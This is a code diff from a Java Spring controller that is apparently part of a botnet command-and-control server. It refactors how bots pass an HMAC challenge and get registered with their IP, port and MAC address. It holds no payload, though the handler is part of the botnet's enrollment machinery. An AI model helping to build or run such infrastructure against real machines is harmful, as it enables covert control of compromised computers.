@@ -20,13 +20,13 @@ import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.servlet.ModelAndView;
 
 import cs.sii.bot.active.CryptoAuth;
-import cs.sii.bot.passive.Bot;
+import cs.sii.bot.passive.BotInitialize;
 import cs.sii.config.bot.Engine;
 import cs.sii.connection.NetworkService;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
-import cs.sii.model.bot.Botter;
-import cs.sii.model.bot.BotterRepository;
+import cs.sii.model.bot.Bot;
+import cs.sii.model.bot.BotrRepository;
 
 @Controller
 public class CommandController {
@@ -38,7 +38,7 @@ public class CommandController {
 	private CryptoAuth auth;
 
 	@Autowired
-	private BotterRepository botRepository;
+	private BotrRepository botRepository;
 
 	@Autowired
 	private NetworkService networkService;
@@ -95,19 +95,23 @@ public class CommandController {
 	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
 			HttpServletRequest request) throws IOException {
 		String response = "";
-
+		
+		String idBot = objects.get(0).toString();
+		String Mac=objects.get(1).toString();
+		String hashMac=objects.get(2).toString();
+		
+		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
+		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
+		
+		
 		if (engineBot.isCommandandconquerStatus()) {
-			if (auth.findBotChallengeInfo(objects.get(1).toString())) {
+			if (auth.findBotChallengeInfo(idBot)) {
 
-				String idBot = objects.get(1).toString();
-				Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
-				Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
-
-				if (auth.validateHmac(keyNumber, iterationNumber, objects.get(0).toString())) {
+		
+				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 					response = "Challenge OK";
-					botRepository
-							.save(new Botter(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),
-									objects.get(3).toString(), objects.get(2).toString()));
+					//botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),objects.get(3).toString(), objects.get(2).toString()));
+					botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(), Mac, null));
 					//TODO DA decidere send some peers
 				}
 
